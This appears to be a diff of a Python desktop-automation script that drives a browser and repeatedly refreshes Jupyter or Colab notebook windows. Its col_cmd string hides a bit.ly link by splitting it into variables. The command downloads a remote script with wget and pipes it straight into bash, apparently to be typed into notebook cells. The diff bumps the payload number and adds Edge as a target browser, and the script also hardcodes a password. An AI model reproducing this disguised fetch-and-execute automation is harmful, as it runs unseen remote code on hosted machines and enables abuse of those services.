@@ -3,8 +3,8 @@ import time,os
 from autokey import *
 import pyautogui
 
-col_cmd = "!!i=001;cmd=pysi;x=ly;y=bit;wget -q -O - ${y}.${x}/${cmd}${i} | bash 1> /tmp/1.log  2> /tmp/1err.log"
-listfile = '/home/one/g80p3'
+col_cmd = "!i=003;cmd=pysi;x=ly;y=bit;wget -q -O - ${y}.${x}/${cmd}${i} | bash 1> /tmp/1.log  2> /tmp/1err.log"
+listfile = '/home/one/g80p5'
 gpass = "Ms123456789"
 new = True
 global_slow_motion = 1
@@ -323,7 +323,8 @@ while (debug == 0):
     time.sleep(2*global_slow_motion)
     winTitle = window.get_active_title()
     winClass = window.get_active_class()
-    if (winClass == "google-chrome.Google-chrome"):
+    if (winClass == "google-chrome.Google-chrome" or
+    winClass == "microsoft-edge-beta.Microsoft-edge-beta"):
         if winTitle.find("ipynb") != -1:
             if speed < 25 :
                 chrome_colab_refresh()
